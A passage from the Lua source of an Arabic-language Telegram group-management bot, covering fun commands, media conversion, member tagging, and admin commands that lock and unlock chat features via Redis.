local nspp = {"10","20","30","35","75","34","66","82","23","19","55","80","63","32","27","89","99","98","79","100","8","3","6","0",}
local rdbhoto = nspp[math.random(#nspp)]
return LuaTele.sendPhoto(msg.chat_id, msg.id, photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id,"*نسبه جمالك هي "..rdbhoto.."% 🙄♥*", "md")
else
return LuaTele.sendText(msg_chat_id,msg_id,'*• لا توجد صوره ف حسابك*',"md",true) 
end
end
end
end
if text and text:match("^قول (.*)$")then
local m = text:match("^قول (.*)$")
if Redis:get(LaRiCa.."sayy"..msg_chat_id) == "off" then
LuaTele.sendText(msg_chat_id,msg_id,'*• امر قول معطل*',"md",true) 
else
return LuaTele.sendText(msg_chat_id,msg_id,m,"md",true) 
end
end
if text == "صورتي" then
if Redis:get(LaRiCa.."myphoto"..msg_chat_id) == "off" then
LuaTele.sendText(msg_chat_id,msg_id,'*• الصوره معطله*',"md",true) 
else
local photo = LuaTele.getUserProfilePhotos(msg.sender.user_id)
if photo.total_count > 0 then
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'صورتك التاليه', callback_data=msg.sender.user_id.."/sorty2"},
},
}
local rep = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id="..msg.chat_id.."&reply_to_message_id="..rep.."&photo="..photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id.."&caption="..URL.escape("• عدد صورك هو "..photo.total_count.." صوره").."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
--LuaTele.sendPhoto(msg.chat_id, msg.id, photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id,"*عدد صورك هو "..photo.total_count.." صوره*", "md")
else
return LuaTele.sendText(msg_chat_id,msg_id,'*• لا توجد صوره ف حسابك*',"md",true) 
end
end
end
if text and text:match("(.*)(مين ضافني)(.*)") then
local StatusMember = LuaTele.getChatMember(msg_chat_id,msg.sender.user_id).status.luatele
if (StatusMember == "chatMemberStatusCreator") then
return LuaTele.sendText(msg_chat_id,msg_id,"• انت منشئ المجموعه","md",true) 
end
local Added_Me = Redis:get(LaRiCa.."Who:Added:Me"..msg_chat_id..':'..msg.sender.user_id)
if Added_Me then 
UserInfo = LuaTele.getUser(Added_Me)
local Name = '['..UserInfo.first_name..'](tg://user?id='..Added_Me..')'
Text = '• الشخص الذي قام باضافتك هو » '..Name
return LuaTele.sendText(msg_chat_id,msg_id,Text,"md",true) 
else
return LuaTele.sendText(msg_chat_id,msg_id,"انت دخلت عبر الرابط محدش ضافك","md",true) 
end
end
if text == "نبذتي" or text == "البايو" then
return LuaTele.sendText(msg_chat_id,msg_id,getbio(msg.sender.user_id),"md",true) 
end
if text == "تحويل" and msg.reply_to_message_id ~= 0 then
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
if Message_Reply.content.photo then
local File_Id = Message_Reply.content.photo.sizes[1].photo.remote.id
local File = json:decode(https.request('https://api.telegram.org/bot'..Token..'/getfile?file_id='..File_Id)) 
local download_ = download('https://api.telegram.org/file/bot'..Token..'/'..File.result.file_path,msg.sender.user_id..'.webp') 
LuaTele.sendSticker(msg_chat_id, msg.id, './'..msg.sender.user_id..'.webp') 
os.execute('rm -rf ./'..msg.sender.user_id..'.webp') 
end
end
if text == "تحويل" and msg.reply_to_message_id ~= 0 then
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
if Message_Reply.content.sticker then
local File_Id = Message_Reply.content.sticker.sticker.remote.id
local File = json:decode(https.request('https://api.telegram.org/bot'..Token..'/getfile?file_id='..File_Id)) 
local download_ = download('https://api.telegram.org/file/bot'..Token..'/'..File.result.file_path,msg.sender.user_id..'.jpg') 
LuaTele.sendPhoto(msg_chat_id, msg.id, './'..msg.sender.user_id..'.jpg','',"md") 
os.execute('rm -rf ./'..msg.sender.user_id..'.jpg') 
end
end
if text == "تحويل" and msg.reply_to_message_id ~= 0 then
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
if Message_Reply.content.audio then
local File_Id = Message_Reply.content.audio.audio.remote.id
local File = json:decode(https.request('https://api.telegram.org/bot'..Token..'/getfile?file_id='..File_Id)) 
local download_ = download('https://api.telegram.org/file/bot'..Token..'/'..File.result.file_path,msg.sender.user_id..'.ogg') 
LuaTele.sendAudio(msg_chat_id, msg.id, './'..msg.sender.user_id..'.ogg','',"md") 
curlm = 'curl "'..'https://api.telegram.org/bot'..Token..'/sendAudio'..'" -F "chat_id='.. msg_chat_id ..'" -F "audio=@'..''..msg.sender.user_id..'.ogg'..'"' io.popen(curlm) 
os.execute('rm -rf ./'..msg.sender.user_id..'.ogg') 
end
end
if text == "تحويل" and msg.reply_to_message_id ~= 0 then
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
if Message_Reply.content.content.voice_note  then
local File_Id = Message_Reply.content.voice_note.voice.remote.id
local File = json:decode(https.request('https://api.telegram.org/bot'..Token..'/getfile?file_id='..File_Id)) 
local download_ = download('https://api.telegram.org/file/bot'..Token..'/'..File.result.file_path,msg.sender.user_id..'.mp3') 
LuaTele.sendAudio(msg_chat_id, msg.id, './'..msg.sender.user_id..'.mp3','',"md") 
os.execute('rm -rf ./'..msg.sender.user_id..'.mp3') 
end
end

if text == "انا مين" then
if msg.sender.user_id == tonumber(1573309498) then
LuaTele.sendText(msg_chat_id,msg_id,"• انت مطور السورس يقلبي🌚♥","md",true)
elseif msg.sender.user_id == tonumber(1573309498) then
LuaTele.sendText(msg_chat_id,msg_id,"• انت مطور السورس يقلبي🌚♥","md",true)
elseif msg.sender.user_id == tonumber(Sudo_Id) then
LuaTele.sendText(msg_chat_id,msg_id,"• انت المطور الاساسي يقلبي🌚♥","md",true)
elseif msg.Devss then
LuaTele.sendText(msg_chat_id,msg_id,"• انت مطوري نور عيني🙄♥","md",true)
elseif msg.Dev then
LuaTele.sendText(msg_chat_id,msg_id,"• انت مطوري نور عيني🙄♥","md",true)
elseif msg.Owners then
LuaTele.sendText(msg_chat_id,msg_id,"• انت مالك الكروب يقلبي🌚♥","md",true)
elseif msg.Supcreator then
LuaTele.sendText(msg_chat_id,msg_id,"• انت منشئ اساسي يقلبي🌚♥","md",true)
elseif msg.Creator then
LuaTele.sendText(msg_chat_id,msg_id,"• انت هنا منشئ يقلبي🌚♥","md",true)
elseif msg.Manger then
LuaTele.sendText(msg_chat_id,msg_id,"• انت هنا مدير يقلبي🌚♥","md",true)
elseif msg.Admin then
LuaTele.sendText(msg_chat_id,msg_id,"• انت هنا ادمن يقلبي🌚♥","md",true)
elseif msg.Special then
LuaTele.sendText(msg_chat_id,msg_id,"• انت هنا مميز يقلبي🌚♥","md",true)
else 
LuaTele.sendText(msg_chat_id,msg_id,"• مجرد عضو هنا","md",true)
end 
end
if text == 'تاك للكل' then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = LuaTele.searchChatMembers(msg_chat_id, "*", 200)
local List_Members = Info_Members.members
listall = '\n*• قائمه الاعضاء \n ٴ— — — — — — — — — —*\n'
for k, v in pairs(List_Members) do
local UserInfo = LuaTele.getUser(v.member_id.user_id)
if UserInfo.username ~= "" then
listall = listall.."*"..k.." - @"..UserInfo.username.."*\n"
else
listall = listall.."*"..k.." -* ["..UserInfo.id.."](tg://user?id="..UserInfo.id..")\n"
end
end
LuaTele.sendText(msg_chat_id,msg_id,listall,"md",true)  
end
if Redis:get(LaRiCa.."addchannel"..msg.sender.user_id) == "on" then
if text and text:match("^@[%a%d_]+$") then
local m , res = https.request("http://api.telegram.org/bot"..Token.."/getchat?chat_id="..text)
data = json:decode(m)
if res == 200 then
ch = data.result.id
Redis:set(LaRiCa.."chadmin"..msg_chat_id,ch) 
LuaTele.sendText(msg_chat_id,msg_id,"• ︙ تم حفظ ايدي القناه","md",true)  
else
LuaTele.sendText(msg_chat_id,msg_id,"• ︙ المعرف خطأ","md",true)  
end
elseif text and text:match('^-100(%d+)$') then
ch = text
Redis:set(LaRiCa.."chadmin"..msg_chat_id,ch) 
LuaTele.sendText(msg_chat_id,msg_id,"• ︙ تم حفظ ايدي القناه","md",true)  
elseif text and not text:match('^-100(%d+)$') then
LuaTele.sendText(msg_chat_id,msg_id,"• ︙ الايدي خطأ","md",true)  
end
Redis:del(LaRiCa.."addchannel"..msg.sender.user_id)
end
if text == "القناه المضافه" then
if Redis:get(LaRiCa.."chadmin"..msg_chat_id) then
LuaTele.sendText(msg_chat_id,msg_id,Redis:get(LaRiCa.."chadmin"..msg_chat_id),"md",true)  
else 
LuaTele.sendText(msg_chat_id,msg_id,"• ︙ لا توجد قناه ","md",true)  
end 
end
if text == "حذف القناه" then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• ︙ هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if Redis:get(LaRiCa.."chadmin"..msg_chat_id) then
Redis:del(LaRiCa.."chadmin"..msg_chat_id) 
LuaTele.sendText(msg_chat_id,msg_id,"• ︙ تم حذف القناه بنجاح","md",true)  
else 
LuaTele.sendText(msg_chat_id,msg_id,"• ︙ لا توجد قناه ","md",true)  
end 
end
if text == "اضف قناه" then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• ︙ هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
Redis:set(LaRiCa.."addchannel"..msg.sender.user_id,"on") 
LuaTele.sendText(msg_chat_id,msg_id,"• ︙ ارسل يوزر او ايدي القناه","md",true)  
end
if text == "قفل القناه" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• ︙ هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• ︙ عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:channell"..msg_chat_id,true) 
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• ︙ تم قفـل القنوات").Lock,"md",true)  
return false
end 
if text == "قفل الدردشه" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Lock:text"..msg_chat_id,true) 
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الدردشه").Lock,"md",true)  
return false
end 
if text == "قفل الاضافه" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end 
Redis:set(LaRiCa.."Lock:AddMempar"..msg_chat_id,"kick")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل اضافة الاعضاء").Lock,"md",true)  
return false
end 
if text == "قفل الدفرخ" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end 
Redis:set(LaRiCa.."Lock:Join"..msg_chat_id,"kick")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل دفرخ الاعضاء").Lock,"md",true)  
return false
end 
if text == "قفل البوتات" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end 
Redis:set(LaRiCa.."Lock:Bot:kick"..msg_chat_id,"del")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل البوتات").Lock,"md",true)  
return false
end 
if text == "قفل البوتات بالطرد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end 
Redis:set(LaRiCa.."Lock:Bot:kick"..msg_chat_id,"kick")  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل البوتات").lockKick,"md",true)  
return false
end 
if text == "قفل الاشعارات" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end  
Redis:set(LaRiCa.."Lock:tagservr"..msg_chat_id,true)  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل الاشعارات").Lock,"md",true)  
return false
end 
if text == "تعطيل all" or text == "تعطيل @all" then 
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end  
Redis:set(LaRiCa.."lockalllll"..msg_chat_id,"off")
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل @all هنا").Lock,"md",true)  
return false
end 
if text == "تفعيل all" or text == "تفعيل @all" then 
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end  
Redis:set(LaRiCa.."lockalllll"..msg_chat_id,"on")
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم فتح @all هنا").Lock,"md",true)  
return false
end 
if text == "قفل التثبيت" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end  
Redis:set(LaRiCa.."lockpin"..msg_chat_id,(LuaTele.getChatPinnedMessage(msg_chat_id).id or true)) 
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل التثبيت هنا").Lock,"md",true)  
return false
end 
if text == "قفل التعديل" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end 
Redis:set(LaRiCa.."Lock:edit"..msg_chat_id,true) 
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل تعديل").Lock,"md",true)  
return false
end 
if text == "قفل تعديل الميديا" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end 
Redis:set(LaRiCa.."Lock:edit"..msg_chat_id,true) 
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل تعديل").Lock,"md",true)  
return false
end 
if text == "قفل الكل" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end  
Redis:set(LaRiCa.."Lock:tagservrbot"..msg_chat_id,true)   
list ={"Lock:Bot:kick","Lock:User:Name","Lock:hashtak","Lock:Cmd","Lock:Link","Lock:forward","Lock:Keyboard","Lock:geam","Lock:Photo","Lock:Animation","Lock:Video","Lock:Audio","Lock:vico","Lock:Sticker","Lock:Document","Lock:Unsupported","Lock:Markdaun","Lock:Contact","Lock:Spam"}
for i,lock in pairs(list) do 
Redis:set(LaRiCa..''..lock..msg_chat_id,"del")    
end
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل جميع الاوامر").Lock,"md",true)  
return false
end 
--------------------------------------------------------------------------------------------------------------
if text == "فتح الاضافه" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end 
Redis:del(LaRiCa.."Lock:AddMempar"..msg_chat_id)  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم فتح اضافة الاعضاء").unLock,"md",true)  
return false
end 
if text == "فتح القناه" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end 
Redis:del(LaRiCa.."Lock:channell"..msg_chat_id)  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم فتح القنوات").unLock,"md",true)  
return false
end 
if text and text:match("^وضع تكرار (%d+)$") then 
local Num = text:match("وضع تكرار (.*)")
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
Redis:hset(LaRiCa.."Spam:Group:User"..msg_chat_id ,"Num:Spam" ,Num) 
LuaTele.sendText(msg_chat_id,msg_id,'\n*• تم وضع عدد تكرار '..Num..'* ',"md",true)  
end
if text == "فتح الدردشه" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end 
Redis:del(LaRiCa.."Lock:text"..msg_chat_id)  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم فتح الدردشه").unLock,"md",true)  
return false
end 
if text == "فتح الدفرخ" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end 
Redis:del(LaRiCa.."Lock:Join"..msg_chat_id)  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم فتح دفرخ الاعضاء").unLock,"md",true)  
return false
end 
if text == "فتح البوتات" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end 
Redis:del(LaRiCa.."Lock:Bot:kick"..msg_chat_id)  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم فـتح البوتات").unLock,"md",true)  
return false
end 
if text == "فتح الاشعارات" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end  
Redis:del(LaRiCa.."Lock:tagservr"..msg_chat_id)  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم فـتح الاشعارات").unLock,"md",true)  
return false
end 
if text == "فتح التثبيت" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end 
Redis:del(LaRiCa.."lockpin"..msg_chat_id)  
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم فـتح التثبيت هنا").unLock,"md",true)  
return false
end 
if text == "فتح التعديل" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end 
Redis:del(LaRiCa.."Lock:edit"..msg_chat_id) 
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم فـتح تعديل").unLock,"md",true)  
return false
end 
if text == "فتح التعديل الميديا" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end 
Redis:del(LaRiCa.."Lock:edit"..msg_chat_id) 
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم فـتح تعديل").unLock,"md",true)  
return false
end 
if text == "فتح الكل" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end 
Redis:del(LaRiCa.."Lock:tagservrbot"..msg_chat_id)   
list ={"Lock:Bot:kick","Lock:User:Name","Lock:hashtak","Lock:Cmd","Lock:Link","Lock:forward","Lock:Keyboard","Lock:geam","Lock:Photo","Lock:Animation","Lock:Video","Lock:Audio","Lock:vico","Lock:Sticker","Lock:Document","Lock:Unsupported","Lock:Markdaun","Lock:Contact","Lock:Spam"}
for i,lock in pairs(list) do 
Redis:del(LaRiCa..''..lock..msg_chat_id)    
end
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم فـتح جميع الاوامر").unLock,"md",true)  
return false
end 
--------------------------------------------------------------------------------------------------------------
if text == "قفل التكرار" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:hset(LaRiCa.."Spam:Group:User"..msg_chat_id ,"Spam:User","del")  
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• تم قفـل التكرار").Lock,"md",true)  
elseif text == "قفل التكرار بالتقييد" then 
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
